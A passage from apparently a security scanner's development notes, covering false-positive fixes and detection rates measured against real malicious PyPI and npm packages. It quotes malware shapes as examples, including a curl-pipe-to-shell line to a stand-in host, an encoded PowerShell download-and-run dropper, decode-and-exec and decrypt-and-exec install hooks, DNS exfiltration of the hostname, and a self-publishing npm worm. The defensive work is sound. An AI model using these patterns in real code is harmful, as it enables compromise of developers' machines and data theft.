other, so a `shutdown_forensics.py` that lists `TracerPid` among the things it
collects was reported for checking whether it is being traced.

*A pattern that matched the right characters in the wrong place.* Three
shell-family spawn rules matched any two characters between backticks, which is
the markdown convention every language's doc comments use -- so the spawn half of
every composite was free in any file that documented itself. `openssl base64 -in
x | tr -d '\n'` was read as decoding because `[^\n]*-d` reached across the pipe.
`transfer.sh` matched inside `weight_transfer.sharded_rdt_common`. `.o` promised
ELF and `.sys` promised PE, and neither is a promise. `pull_request_target` in an
`if:` that EXCLUDES the trigger was read as using it.

*A fact about a tool that was wrong.* `prepare`, `prepack` and `prepublish` were
treated as running on every machine that installs a package; npm has documented
since version 7 that they run on the author's. `open.feishu.cn`,
`oapi.dingtalk.com` and `qyapi.weixin.qq.com` were listed as serving nothing but
webhook ingest; each is the whole of a platform's open API.

*A value that said what it was and was not read.* A key named `placeholder`. A
base64 body that decodes to an English sentence. A value that is its own
variable's name plus a number. An AWS access key id with no secret beside it,
which cannot authenticate. Firebase's web configuration, identified by the
`authDomain` that only it has. A value that is two or more real words
concatenated -- the single largest shape in the largest class, measured against
twenty-one real committed credentials from the same sample, none of which it
touches.

Two fixes were caught by their own tests before they were committed, and one by a
guard value written in an earlier pass: a first draft of the word test asked for
two lowercase letters per run and dismissed `hc2wb63opyfxnwn`, a real credential
the cumulative-budget test already held. That test now asks every value predicate
together, because a widening measured once and never again is how a budget drifts.

Three `baseline_hits` declarations came down when the backtick narrowing landed.
A narrowing that changes no declaration is a narrowing nobody measured.

**A fourth primitive was standing in for a different act.** `DELAY` is separated
from `ANTI_ANALYSIS`, and unlike the three before it this one was found by
measuring rather than by reading a composite's message.
`SUSPECT.ANTI_ANALYSIS.001` is titled "Behaviour gated on whether it is being
observed" and accepted a long sleep as the gate. A sleep gates nothing: it
produces no answer to "am I being watched?", which is what every other member of
that family produces.

Every delay-only finding across two sampling passes was a wait -- a thread held
open so a partial download's handle survives, a heartbeat printed every five
minutes, a cross-compilation container kept alive, five minutes between checks of
a package repository. Four for four. And no sample in the malicious corpus uses a
sleep at all: the one that gates on the analysis environment tests
`os.environ["CI"]`, the hostname and `sys.gettrace`, so the split costs nothing
the corpus measures. Nothing consumes `delay` yet, and a test says so, because the
next person to add a composite over it should have to delete that line and say
why.

The loop's last two rounds also fixed the thing `CAP.ANTI.DELAY.001` had asked for
in writing. Its own comment said a sleep at the top of a loop is a schedule rather
than a delay, that the only way to express that in one regex is a lookbehind over
a fixed indentation, that "a pattern that works at eight spaces and fails at four
is worse than the finding it removes", and that doing it properly means asking the
AST. `pyast.loop_delay_lines` is that, and it asks about the whole loop body:
a retry loop that sleeps after its attempt is the same shape and the same claim.

**Six more rounds, sampled from the fourth pass as it ran.** Each started with the
worst repository in the newest slice, which is where the remaining findings
concentrate.

*Declarations a file makes about itself.* Every Go CLI built on cobra declares its
help text in a raw string, and kubectl's `set-credentials` example carries a
password -- identified by the author's own name for the variable, because a
kubectl example block has no prompt in front of it. A full-length RSA key declared
as `sampleServerPrivateKeyPEM`, where reading the body cannot help and reading the
name can. A Metasploit module, which carries a header comment and a base class
every module in the framework shares, and an Nmap script that says
`categories = {"exploit"}`: a detection rule is published in order to be matched
and an exploit is published in order to be run, which is the same argument twice.
A yt-dlp extractor, identified by the `IE` class suffix and a relative import,
holding eighteen real credentials that belong to television networks -- read out
of public pages, still in those pages, and not yt-dlp's to rotate, so "rotate this
credential" is not advice it can take.

*Two keys that mean something else.* A `ValidatingWebhookConfiguration` has
`resources: ["*"]` to say which resources the webhook INSPECTS, and istio ships
four; that is a new field rather than a mitigation, because the weakness is absent
rather than controlled, and it is scoped to the YAML document because a bundle
holds both a webhook and a real ClusterRole. And an author-time lifecycle hook's
script is not install-time code: the tenth pass graded the declaration and the
engine still marked the script it named, so `MALWARE.ANTI_ANALYSIS.001` stayed at
critical on the three-line `prepare.mjs` that the anti-analysis composite's own
comment cites as the false positive it was corrected for.

*And one latent test bug the version bumps exposed.*
`SecretDetector.version > "0.2.0"` was a string comparison. It started failing when
the detector reached `0.10.0`, which is lexicographically smaller. The test was
right about what it wanted and wrong about how to ask.

**The rounds ended where the sampling ran out of classes, not of patience.** The
eleventh round mirrored 103 infrastructure-posture targets and every one of its 58
findings was the literal text the rule names. The thirteenth and fourteenth worked
through the nine classes the completed third pass still blocked on outside the
fetch-and-execute and posture families, and took 135 findings to 96 -- after which
the residue reads, line by line, as `"Action": "*"`, a systemd unit being written,
a launch agent being registered, `source <(curl ...)`, a real `TracerPid` read in a
forensics tool, and committed private keys. Those are kept as tests too, so that a
later widening has to argue with them.

By the end the four noisiest repositories in the fourth pass's opening slice were
producing almost nothing but the two policy families -- istio 14 findings of 14,
argo-cd 13 of 13, swift-nio 6 of 6, kubernetes 13 of 15. That is what convergence
looks like from the other end: the repositories that were hardest on this tool have
stopped telling it anything new.

*One more round, after the fourth pass, from the other end of the severity
scale.* Everything above sampled by volume. The twenty-ninth round sampled by
**grade** instead: the 24 findings the fourth pass reported at `MALWARE`
severity across 1,427 ordinary open-source repositories, on the argument that a
wrong critical is the most expensive finding this tool can produce. Mirroring the
22 files those findings named and rescanning them against the merged tree left
four -- every numpy, pytorch, mongodb, servo and sympy `DYNAMIC_DISPATCH`
finding was already gone, fixed by rounds nineteen to twenty-eight. Of the four
survivors, one was `digininja/DVWA`'s `vulnerable.yml` serialising its whole
secret context, which is a repository that exists to contain true positives.

The other three were two defects:

- **A presence test is not a credential read.** `"NAME" in os.environ` obtains no
  value at all. The AST tier already drew the line the pattern tier draws -- a
  named setting is not the whole environment -- for `os.environ["PORT"]`,
  `os.environ.get("PORT")` and `os.getenv("PORT")`, by registering the key at the
  parent node. A `Compare` was not one of the parents it registered, so a
  membership test handed the walk a bare `os.environ` with no key attached, and
  got the broadest reading available for the narrowest act there is.

  `saltstack/salt` writes `if "WRITE_SALT_VERSION" in os.environ` three times in
  its `setup.py`; `setup.py` is install-time by definition and the same file
  downloads its bootstrap script. That was `MALWARE.EXFIL.001` at CRITICAL --
  "reads credentials and transmits them" -- for build flags that gate a version
  string. Judged by the name now, like every other keyed read, so
  `"GITHUB_TOKEN" in os.environ` still counts and a computed key still reads as
  the broad access.

- **One observation was reported twice.** The composites come in graded pairs on
  purpose: `SUSPECT.EXFIL.001` is credential access with egress, and
  `MALWARE.EXFIL.001` is that same pair inside an install hook. Where the install
  hook is what the file is, both clauses are satisfied by the same capabilities at
  the same place, and both findings were reported -- so one line of
  `tinyhumansai/openhuman`'s `install.js` appeared twice, once at medium and once
  at critical. Seven findings across five repositories of 1,427 were this. The
  stronger rule's match clause is the weaker one plus the context, so there is no
  residual claim to ceiling and the weaker finding is dropped. Four malicious
  corpus expectations now name the `MALWARE` rule they were already producing.

*And a duplicate-hit bug the same file exposed.* `os.getenv` is both a primitive
and an `Attribute`, so a single `os.getenv("GH_TOKEN", os.getenv("GITHUB_TOKEN"))`
in vLLM's `setup.py` produced four identical credential hits at one span:
`_call` recorded each call, and the bare-`Attribute` branch -- which exists for
`os.environ`, a primitive that is never called -- recorded each `os.getenv`
again. Reading a function without calling it is not the act the primitive
describes.

*A thirtieth round, sampling the same way.* The twenty-ninth round took the
`MALWARE`-graded findings; this one took the rest of the fourth pass's criticals
and every provider-specific secret finding -- 24 findings in 20 repositories.
Several were true positives of the most important kind and are reported
correctly: `binary-husky/gpt_academic` has a live-shaped OpenAI key and a
HuggingFace token committed in its `docker-compose.yml` and `config.py`,
`ethereum-lists/chains` publishes an RPC endpoint with its credentials in the
URL because that is how those endpoints are shared, and `tennc/webshell` and
`bridgecrewio/terragoat` are repositories that exist to contain true positives.
Three were defects:

- **A host ends where the string ends it.** `CONNECTION_STRING` captured its host
  as `[^\s@/?#]{1,120}` -- everything up to a character that ends a URL's
  authority component, which does not include the quote that ends the string the
  URL is written inside. The captured host came back as `my.example.com")`, and
  `LOCAL_OR_RESERVED_HOST` is anchored at both ends, so **every reserved-host
  exclusion it makes silently failed for a URL inside a quoted expression** --
  which in source code is nearly all of them, `localhost` and `[::1]` included.

  Ruby's own `lib/uri/generic.rb` documents `uri.user=` with
  `URI.parse("http://john:S3nsit1ve@my.example.com")` in an RDoc comment, and
  that was a high-severity finding: a credential for the domain RFC 2606 reserves
  so that documentation can do exactly this. The host is matched as a host now --
  an IPv6 literal, or a dot-separated sequence of letter-digit-hyphen labels.

  One consequence worth naming: a host written as a template expression, such as
  Docker Swarm's `@{{ index .Service.Labels ... }}_postgres`, no longer matches at
  all, where before it matched as an opaque run of characters. That is the same
  judgement in a different place -- a host nothing can resolve is not a host a
  credential authenticates to.

- **A key on the line above its own value was not read.**
  `key_name_is_illustrative` reads the declaration line, which was narrowed to one
  line on purpose after four identifiers back reached a `sampleOther` on an
  unrelated statement. Appwrite's function templates wrap: `'placeholder' =>`
  ends one line and the example MongoDB URL it describes is the whole of the
  next, so the declaration line held no identifier at all and the name that says
  the value is an example was never consulted. One line back now, and only when
  this line has no name to read. The connection-string rule consults the
  predicate at all now, which it never had -- a connection string is the form
  documentation shows most often, because it is the form a user has to type.

- **A prefix is half of a format.** `SECRET.GITHUB.TOKEN.001` matched
  `(?:ghp|gho|ghu|ghs|ghr|github_pat)_[A-Za-z0-9_]{20,}`, and twenty is not a
  length GitHub issues: a classic token is `ghp_` and exactly 36 base62
  characters, a fine-grained one is `github_pat_`, 22, `_` and 59.
  `JamesWoolfenden/pike` generates Terraform fixtures for its IAM policy tool and
  one sets `token = "ghp_"` followed by twenty-five lowercase letters -- not a
  token by length or by alphabet, reported at CRITICAL and HIGH confidence
  because the pattern asked for twenty of anything.

*A thirty-first round, on the classes no earlier round had sampled at all* --
the Google API keys, the credential-store findings and the bidirectional-text
findings, 37 findings in 31 repositories. Two defects, and one class declined
after measuring it.

- **A file that IS right-to-left text.** `_orders_rtl_text` asks whether a
  directional control sits beside right-to-left script within twenty-four bytes,
  and that is the right question almost everywhere. It cannot answer the case
  where the string being ordered contains no script at all. Thunderbird's Persian
  Android resources carry an `RLE` and an `RLM` in front of a string whose whole
  content is two substituted placeholders -- a filename and a size -- so that what
  gets substituted renders the right way round in a right-to-left interface, which
  is exactly what `RLE` is for. There is no Persian inside the window because
  there is no Persian in the string; the lines either side of it, and the file,
  are unmistakably Persian.

  So the question is asked of the file as well. Measured: that file is **25.2%**
  right-to-left by letter, `dimagi/commcare-hq`'s 1.2MB webpack bundle is
  **0.01%**, and this project's own source is **0.00%**. The threshold is 10% --
  set below the floor of a genuine translation rather than just above the noise,
  so a source file with a handful of Arabic test strings in it does not become
  exempt. Note what it does not excuse: the right-to-left **override** in that
  webpack bundle, which stays a high-severity finding.

- **Nothing owns a `.netrc`.** The credential-store rule's premise is that the
  access is unexplainable -- these are files "read by the software that owns them
  and by essentially nothing else". `.kube/config` was removed from the list once
  already for failing that test. `.netrc` fails it more broadly: a kubeconfig at
  least names one kind of service, and `.netrc` names none. It is the generic
  credential file for arbitrary hosts, and its readers are curl, wget, git, pip,
  bazelisk and every other tool that authenticates a download without prompting,
  which is what it was created for.

  Six of the ten credential-store findings sampled were this one file name.
  `mongodb/mongo`'s `bazelisk.py` reads it with
  `netrc.netrc().hosts.get(parts.netloc)` to download Bazel, its
  `query_correctness_corpus_fetch.py` documents its own authentication as "a
  GitHub token from the environment, `~/.netrc`, or the gh CLI", and
  `LeCoupa/awesome-cheatsheets` shows `mv ~/.netrc ~/.netrc.backup` as the way to
  reset a Heroku login. It stays credential material on the same terms as the
  kubeconfig, so the three-signal and install-hook rules still see it.

*A thirty-second round, on the two biggest classes left unsampled* --
decode-and-execute (41 findings) and the polyglot mismatches (29). Two defects.

- **One call was two of a composite's capabilities.** `marshal.loads(` is
  `execute` to the pattern tier -- a marshal stream holds code objects, so loading
  one is an evaluation wearing a serialisation format, and `CAP.PY.EXECUTE.001`
  argues it at length -- and the AST tier labelled it `decode` as well. Together
  they handed `SUSPECT.DECODE_EXEC.001` both halves out of one call.

  **CPython's own `Lib/importlib/_bootstrap_external.py` was reported for it.**
  `_compile_bytecode` is three lines long, its body is
  `code = marshal.loads(data)`, and it is the function every `.pyc` in the world
  is loaded by. `Lib/idlelib/rpc.py` and catboost's resource importer are the same
  shape.

  Fixed at the classification: `marshal.loads` is no longer in the AST tier's
  decode map, because the pattern tier's `execute` is the deliberate, argued
  reading and the second label was the accident. Nothing is lost, because the
  two-call forms take their decode from the other call --
  `marshal.loads(base64.b64decode(DATA))` is base64 decoding and marshal
  executing, and an existing class in `test_review_defects` asserts that file must
  block. Only a lone `marshal.loads(data)` goes quiet, which is the importer.

  *Two earlier attempts are recorded because each was wrong in a way worth
  keeping.* Merging capability hits by overlapping span made a **nested** call one
  act -- and nesting is how a dropper is written, so it silenced
  `exec(base64.b64decode(blob))`, the plainest true positive there is. Comparing
  the two tiers per line instead then looked correct and passed every test, and
  was wrong in the direction that matters: `from base64 import b64decode` followed
  by `exec(b64decode(...))` is two calls on one line, the pattern tier labels only
  `exec` there because its decode pattern wants the `base64.` prefix, and the AST
  tier's decode was discarded exactly when it was the only witness. It also
  silenced the `saltstack/salt` dynamic-dispatch finding this release had already
  decided to keep. Both were found by measuring against real malicious packages
  rather than by running the suite.

- **`test cases/` is a test directory.** A space separates words in a directory
  name and nothing split on it. Meson keeps its entire suite under `test cases/`
  with a subdirectory per case -- `test cases/rust/25 cargo
  lock/subprojects/packagecache/bar-0.1.tar.gz` -- and two deliberately malformed
  archives in there were reported as files contradicting their own names. The
  segment is not `test`, does not end in `test`, and holds no dot, dash or
  underscore to split on. Whole words still, which is what keeps it safe:
  `latest builds` splits to `latest` and `builds` and matches neither, the same
  way `latest` alone does not.

*The polyglot mismatches were checked and are right.* `swisskyrepo/
PayloadsAllTheThings` ships `ghostscript_rce_curl.jpg` and
`imagemagick_ghostscript_cmd_exec.pdf`, which are deliberate polyglot payloads.
The three that looked like tool errors are not: `hashcat`'s vendored
`argon2-specs.pdf` begins `Argon2: the memory-hard function` in plain ASCII and
is not a PDF, `sqlitebrowser`'s `iconos2.ico` is an OS/2 bitmap array rather
than an ICO, and `tinyhumansai/openhuman`'s `zai.ico` is **gzip** that
decompresses to `<!doctype html>` -- somebody's `curl` of an icon URL captured a
web page and it was committed as the icon. Re-fetched with compression disabled
to rule out a transport artefact; the bytes are the same either way.

*A thirty-third round, and the one where the sampling ran out.* The classes left
were the CI and Kubernetes posture findings, the packer signatures, the
executables committed under `scripts/`, the plugin loaders and the persistence
findings -- 46 findings across five rules. **Most of them are accurate**, and
two small defects came out of it:

- **A minified library is upstream's to unpack.** Every packer finding sampled is
  a third party's minified JavaScript. `octobercms/october` carries
  SyntaxHighlighter 3.0.83 under `modules/system/assets/vendor/`, still wearing
  Alex Gorbatchev's copyright header, and `Qloapps/QloApps` has four jQuery
  plugins under `js/jquery/plugins/` with Andreas Eberhard's. The rule's claim
  stays true -- a packed file cannot be reviewed -- but its remediation, "obtain
  the original source and review that", is somebody else's work and upstream's to
  do. The capability detector has ceilinged vendored code for this reason since
  the twenty-third round; this detector was not asking.

  The ceiling block is shared by every rule in that detector, so this reaches the
  bidirectional and escape-run rules as well. Deliberate rather than incidental --
  the three tests beside it already behave that way, and a bidi override in a test
  fixture has been ceilinged since they were added -- and what it gives up is
  worth stating: a directional override smuggled into a checked-in dependency
  drops below the failure gate. Two things bound that. `node_modules`, where an
  installed compromise actually lands, never reaches the rule at all because the
  walker prunes it and reports the prune; and a `vendor/` tree is committed code,
  so the override arrives in a diff somebody can see -- which is the condition
  Trojan Source needs to defeat, and the reason this is a ceiling rather than an
  exemption.

- **An uninstaller takes the persistence away.** `pi-hole` keeps
  `automated install/uninstall.sh`, which removes the systemd units and the cron
  entry its installer wrote, and it was a high-severity persistence finding --
  for the script whose entire job is taking the persistence away. Two gaps, and
  the same two `names_test_directory` had for meson's `test cases/`: `uninstall`
  was not one of the installer words, and only the basename was read, so the
  directory that says `install` was never seen.

*What the round confirmed rather than changed.* The eleven CI
expression-injection findings are all `${{ github.event.* }}` reaching a `run:`
block, which is the documented vulnerability and worth every one of them. The
six executables under `scripts/` are real: three Microsoft Visual C++
redistributable DLLs in `Anxcye/anx-reader` and three committed macOS build
tools in `lwouis/alt-tab-macos`. The eleven plugin loaders -- PyYAML's
`find_python_name`, Sentry's social-auth backends, CPython's `forkserver` -- are
dynamic dispatch doing the job it exists for, and the eleven persistence
findings are provisioners writing systemd units and `ollama` installing its own
launch agent, which is what those programs are for.

That is the shape the loop was looking for: a round where the residue reads,
line by line, as the thing the rule names.

**What rounds twenty-nine to thirty-three are worth, measured.** None of them is
in the fifth pass, which measures rounds one to twenty-eight. Rather than guess,
the 101 files those five rounds were triaged against -- every file mirrored for
them, across 80 repositories -- were scanned twice, once with the tree the fifth
pass is measuring and once with the tree carrying all five rounds:

| | blocking findings over those 101 files |
|---|---|
| rounds one to twenty-eight | 80 |
| rounds one to thirty-three | **65** |

Nineteen per cent fewer on the files chosen for being the hardest cases in the
corpus, and no finding lost that any round argued should stay. Three findings
moved rather than went: `pike`'s Terraform fixture is no longer a critical GitHub
token and is now a high generic assignment, because `token = "ghp_"` and
twenty-five lowercase letters is a credential-shaped value under a credential
name whatever the prefix promised; and the Keras and TensorFlow findings moved
two lines up onto the `codecs.decode` that genuinely precedes their
`marshal.loads`.

That is a sample of the hard cases and not a corpus measurement. What it does
establish is the direction and the absence of regressions; the number for the
corpus needs its own pass.

### Detection, measured against real malicious packages

Everything above this section measures **noise**: how much of what the tool says
is wrong. None of it says whether the tool finds anything. Those are different
questions and only one of them had been measured.

The answer, when it was: **14.9%**. Of 201 real malicious PyPI packages sampled
from the ASE 2023 dataset -- one version per package, random, seed recorded --
thirty produced a blocking finding, eleven produced one held below the failure
gate, and **160 produced nothing at all**. Only four of the 201 were payload-free
name squats, so those were genuine misses.

The tool scored 39/39 on this project's own malicious corpus at the same moment.
A corpus written by the same hands as the rules is a self-graded exam, and it
graded generously. One measurable sign of it: all eleven samples that carry a
credential read with an egress call have them within **five lines**, median one,
while the composite allows two hundred -- the samples never exercised distance at
all.

**After the five fixes below, on an independent 1,437-package sample drawn with a
different seed and never tuned against: 82.5%.**

| | recall |
|---|---|
| before | 14.9% |
| an encoded command's plaintext reaches the rules | 69.2% |
| the minified ceiling stops excusing Python | 71.6% |
| decryption counts as a decode | 77.6% |
| `marshal.loads` fixed at the classification | 79.6% |
| `RECONNAISSANCE`, and the install-time beacon | 81.6% |
| the `cmdclass` install override | 86.1% |
| *the same tree, on the independent sample* | **87.5%** |

Noise did not move while this happened: the 101-file hard sample went from 65
blocking findings to 66, the one addition being the `saltstack/salt`
dynamic-dispatch finding this release had already decided to keep; the benign
corpus stayed clean; the malicious corpus stayed at 39/39 and is now 42.

- **`powershell -EncodedCommand <base64>` -- 109 of the 171 misses, one
  technique.** Written in a `setup.py` as `subprocess.Popen('powershell
  -WindowStyle Hidden -EncodedCommand <blob>')`, where the blob decodes to
  `Invoke-WebRequest -Uri "https://.../x.exe" -OutFile "~/WindowsCache.exe";
  Invoke-Expression "~/WindowsCache.exe"`. Cordon labelled the call `spawn`, the
  shell pack's own `-enc` pattern labelled it `execute`, and there it stopped: no
  `decode`, because the decoding is done by `powershell.exe` rather than by any
  call in the file, and no `egress`, because the URL is inside the blob. The
  dropper composite had no egress and the decode-and-execute composite had no
  decode. The blob is decoded now and handed to the shell rules as a second
  command, so what it contains is matched rather than only that it exists.

- **A noise ceiling was hiding malware.** `_is_minified` ceilings a finding when
  a file has a thousand-character line, and its reason is sound: a minified
  bundle contains a decoder beside an evaluator because that is what a module
  loader is. That is a fact about **bundlers**, which are a JavaScript practice.
  `bettercolor`'s payload is a pyobfuscate blob in a library module -- a 12KB
  `.py` file with a 6,307-character line -- and the ceiling took
  `SUSPECT.DECODE_CHAIN.001` from critical to medium, so a gate would have passed
  it. Obfuscated malware looks exactly like minification, and Python is not a
  language anybody minifies. The ceiling now needs a bundler's extension as well
  as the long line.

- **Decryption is a decode with a key.** Twenty-two of 201 are a
  `setuptools.command.install` subclass whose `run` is
  `exec(Fernet(b'<key>').decrypt(b'<ciphertext>'))`. `exec(` supplied the
  execute; nothing supplied the decode, because the model had no notion of
  decryption. Content that cannot be read until it is transformed is what the
  decode primitive is about, and needing a key makes it more opaque rather than
  less. The composite keeps it honest: legitimate code decrypts data and then
  uses it, and `exec(decrypt(...))` is one expression.

- **`Capability.RECONNAISSANCE`**, the fifth primitive to arrive by splitting one
  that stood in for a different act. `socket.gethostname()`,
  `getpass.getuser()`, `os.getcwd()` and `os.environ["COMPUTERNAME"]` are not
  credentials -- nothing authenticates with a hostname -- so `CREDENTIAL` could
  not be widened to hold them without diluting every composite that reads it.
  They were simply unlabelled, and they are the whole of the install-time beacon:
  fifty-two of the 1,437 read the machine's identity and post it while the
  package installs, and not one produced a finding. `MALWARE.EXFIL.BEACON.001`
  pairs it with egress inside an install hook, at ten lines rather than two
  hundred, because these are written as a block.

- **A literal command can still be the attack.** A spawn whose whole argv is
  written out is discounted, on the argument that it cannot be running something
  decoded or downloaded. True of `subprocess.run(["git", "rev-parse"])` and false
  of `os.system("curl https://drop.invalid/s.sh | sh")`, which is equally
  literal. Being readable is not being harmless. The discount now yields on any
  line where the command itself carried a capability.

Three of the shapes are in `corpus/malicious/` as `encoded-powershell-dropper`,
`install-command-decrypt-exec` and `install-beacon-reconnaissance`, rewritten so
no live payload is committed, each paired in `test_review_defects.py` with the
benign shape it must not catch -- a build that runs PowerShell, a program that
decrypts data and uses it, a build that downloads an input it names.

### Detection, known and not fixed

- **Whose machine the code runs on.** `install_hook` is true of every `setup.py`
  ever written, and it has to be: the file's existence means arbitrary Python
  runs during a build. What it does not mean is "this runs for everybody who
  installs the package", and the difference was **82 of the 252** misses -- the
  largest family left. They are all a `cmdclass` override of the `install`
  command, which setuptools runs on the machine of whoever installs the package,
  doing something that is no part of building it.

  The composite was measured **without** the distinction first: `install_hook`
  paired with egress or spawn put `saltstack/salt` and `vllm` at critical, which
  are the two false positives rounds twenty-nine and thirty removed. It was
  reverted and the narrower context built instead. The pypi parser now reads the
  override out of the syntax tree -- executing nothing, which is the same reason
  that parser already recovers metadata this way -- and reports it as a
  consumer-time hook; `ScanContext.consumer_install_paths` carries it; and
  `MALWARE.INSTALL.CONSUMER_CODE.001` pairs that context with egress, spawn or
  fetch-and-execute.

  Both halves are required, and the discrimination was verified rather than
  assumed. `vllm` subclasses `build_ext` and `build_rust`; `saltstack/salt`
  subclasses `develop`, `sdist` and `bdist_egg`; a subclass nobody passes to
  `cmdclass` is dead code. None of them produces the context. Twelve real Python
  projects were probed for the new class -- pytorch, transformers, PaddleOCR,
  superset, youtube-dl among them -- and **none fires it**; legitimate projects
  override the build, not the install. The 101-file hard sample did not move.

  It is the same distinction npm has documented since version 7 and that
  `core.models.CONSUMER_TIME_HOOKS` already drew for `postinstall` against
  `prepare`. Python simply had no equivalent, so the Python side of the tool was
  reading every `setup.py` as one undifferentiated hook.

- **What the remaining 252 are.** 82 the override above; 58 an egress with no
  other recognised shape; 23 an `exec` or `eval` alone; **20 payload-free**; 18
  `__import__('builtins')` chains; 18 a spawn alone; 9 a Python payload written
  into a string literal; 24 across webhooks, wallet-mnemonic exfiltration,
  escape-obfuscated `eval` and `curl` inside `os.system`.

  With the override implemented the measured figure is **87.5%** on the
  independent sample. Of what is left, the twenty payload-free packages and the
  eighteen whose only signal is that they start a process are the floor: a
  behaviour-based scanner cannot report a package that has no behaviour, and
  `subprocess.call("/bin/sh")` is also what a legitimate shell wrapper does.
  Those need a different detector -- name similarity against the real package
  index, which is `SUSPECT.DEPENDENCY.TYPOSQUAT.001` and currently runs off a
  hand-curated list of thirty-seven names.

  So **a measured 100% on this dataset is not a target this tool should meet**,
  because meeting it means fitting rules to 1,437 particular packages and the
  number then measures nothing. The guarantee worth holding it to is the one the
  project already states in `detect/pyast.py`: *no evasion is silent -- every
  technique used to hide behaviour is either resolved to the real behaviour, or
  lights up a signal of its own.* That is checkable, and the residue under it is
  packages that hide nothing because they do nothing.

### Detection, npm

The PyPI figure was never a tool figure. Measured against Datadog's dataset of
real malicious npm packages -- 28,623 samples from GuardDog, split into
`malicious_intent` and `compromised_lib` -- the first reading was **59.4%**
against PyPI's 87.5%. After the work below, on 917 of them: **71.1%**, or
**83.3%** of the packages that carry anything a behaviour scanner could see.

Re-measured after the six fixes below, on 999 samples: **78.8%**, or **89.8%**
of the packages carrying anything a behaviour scanner could see.

| | first reading | after the ecosystem work | after the six fixes |
|---|---|---|---|
| overall | 59.4% | 71.1% (of 917) | **78.8%** (787 of 999) |
| of those carrying a payload | -- | 83.3% | **89.8%** |
| `malicious_intent` | -- | 66.6% | **78.4%** |
| `compromised_lib` | -- | 76.5% | 79.2% |

`malicious_intent` had been stuck at exactly 333 of 500 across two runs -- every
earlier fix moved `compromised_lib` and left it untouched. It moved by
fifty-nine packages, and the rule counts say which fix moved it:

| rule | before | after | the fix |
|---|---|---|---|
| `SUSPECT.REGISTRY.SELF_PUBLISH.001` | 35 | **82** | the `_is_minified` mean-line test |
| `SUSPECT.DROPPER.001` | 3 | **17** | `Function.constructor`, and the `await` fetch shape |
| `SUSPECT.DECODE_EXEC.001` | 4 | **10** | the same two |
| `SUSPECT.OBFUSCATION.PACKED.001` | 48 | **282** | the per-file budget |

The last row is not a recall number and is the most important line in the table.
Those packages mostly blocked before and block now. What changed is that
cordon **reads the payload**: 234 packages whose verdict was "this package has a
preinstall script" -- the finding `bcrypt` gets -- now carry a finding that names
the file as obfuscator output. A gate cannot tell a compromised package from
`bcrypt` on the first of those. A reader can tell them apart on the second.

| | packages |
|---|---|
| detected, blocking | 787 (78.8%) |
| missed, carrying a payload | 89 |
| **missed, no detectable payload in the archived tarball** | **123** |

That last row is the honest denominator and it is a property of the dataset
rather than an excuse. `compromised_lib` entries are flagged by *version*,
because that version was caught up in an incident; the tarball Datadog archived
does not always contain the injected code. `@mastra/core@1.42.1` is 2,640 files
and 77MB, its `package.json` scripts are `tsup`, `vitest` and `eslint`, and
there is no install hook and no dangerous call anywhere in its shipped
JavaScript. A scanner that reports behaviour cannot report behaviour that is not
in the file.

Fifty-eight of the 212 remaining misses are `@mastra/*` from that one incident.
**Not one of the fifty-eight declares an `install`, `preinstall`, `postinstall`
or `prepare` script**, and the two read by hand contain no payload at all -- the
`atob` that a keyword search finds in `@mastra/core` is an ordinary
base64-to-`Uint8Array` helper. If those tarballs are clean captures the figures
are 83.6% overall and 93.2% of payload-carrying packages. Both numbers are given
because fifty-eight were checked for hooks and two were read; that is the
evidence there is, and the larger number is not the one to quote.

**None of the gaps were new ideas.** They were the same acts the Python packs
already name, missing from the JavaScript ones, which is exactly the failure the
capability model exists to prevent -- a primitive is meant to be defined once
and inherited by every language. It went unnoticed because nobody had measured
the ecosystem.

- **DNS exfiltration had no JavaScript resolver.**
  `CAP.EGRESS.DNS_CONSTRUCTED.001` knew `socket.gethostbyname`,
  `dns.resolver.resolve`, `dig` and `nslookup`, and nothing from Node.
  `@aa-techops-ui/ping-authentication` is four lines and the whole technique:

      dns.resolve4(tohex(os.hostname()) + ".<id>.<attacker>", ()=>{})

  repeated for the username, the home directory and `__dirname`. The hostname is
  the payload, hex-encoded to survive a DNS label, leaving through the resolver
  the host already trusts.

  `SUSPECT.EXFIL.DNS.001` also required a `credential` alongside it, and a DNS
  label is 63 bytes -- room for a machine name, not for a key. It takes
  reconnaissance now, which is what actually goes out that way.

- **`Capability.RECONNAISSANCE` had no JavaScript rule.** It was added for Python
  in the same session and the JavaScript half was simply not written.
  `os.hostname()`, `os.userInfo()` and `os.homedir()` are the same act.
  `os.platform()`, `os.arch()` and `process.cwd()` are deliberately excluded:
  every bundler and test runner in the ecosystem calls them, and they say what
  kind of machine this is rather than which one.

- **A package that publishes packages.** Twenty-six of the first 143 samples are
  a registry-spam worm: `exec('npm publish --access public')` in a loop, each
  iteration rewriting `package.json` with a generated name. A library has no
  reason to publish anything -- by the time it runs, its own release is long
  over. `SUSPECT.REGISTRY.SELF_PUBLISH.001`.

*And a false positive the npm control found, on one of the most installed
packages there is.* `{ ...process.env, FOO: undefined }` is how every Node
program builds an environment for a child process, and the JavaScript credential
rule read the spread as reading the whole environment. **esbuild** writes exactly
that in its postinstall and downloads its own platform binary a few lines later:
install hook, plus "credential", plus egress is `MALWARE.EXFIL.001` at CRITICAL,
about a build fetching its own binary. Reading the environment to pass it on is
not serialising it to send; the patterns that are that -- `JSON.stringify`,
`Object.entries`, `Object.assign`, and now the form-encoders -- remain.

*Two more, and both are a noise ceiling found holding real malware below the
line -- the second and third time in this release.* `@aifabrix/miso-client` hides
its payload in **9,123 consecutive invisible Unicode characters** (the Variation
Selectors Supplement, U+E0100-U+E01EF) and `eval`s it a few lines later. The
obfuscation detector knew the bidirectional overrides and the byte-order mark and
had never been told about that block, so the file reported nothing at all;
`CAP.INVISIBLE_SMUGGLING.001` covers both it and the Tags block now, at eight or
more in a row, which is past the seven a subdivision flag emoji needs. The first
draft covered only Tags and did not match the measured file, which is why the
range is written out rather than assumed.

Detecting it was not enough. The payload sits in `dist/`, so the finding came out
at MEDIUM and a gate would have passed it. Every ceiling in that chain makes one
argument in different words -- test material, documentation, generated output, a
vendored library, a minified bundle: *this is not really code somebody wrote to
run*. A run of thousands of invisible characters defeats all of them at once,
because none of those things contains one and the only reason to write one is so
that a reader does not see it. The chain now yields to that indicator, and the
package reports CRITICAL.

*And a dropper that was two lines of plain JavaScript.* `pretty-chalk` is
`axios.get(decoder.decode(uint8Array)).then(response => new Function("require",
response.data.model)(require))` -- download code, run code. Both primitives
fired, and `SUSPECT.DROPPER.001` needs a third signal saying the thing executed
IS the thing fetched. The fetch-and-execute patterns all required the fetch to
sit lexically inside the evaluator, so the `.then` callback form -- which is how
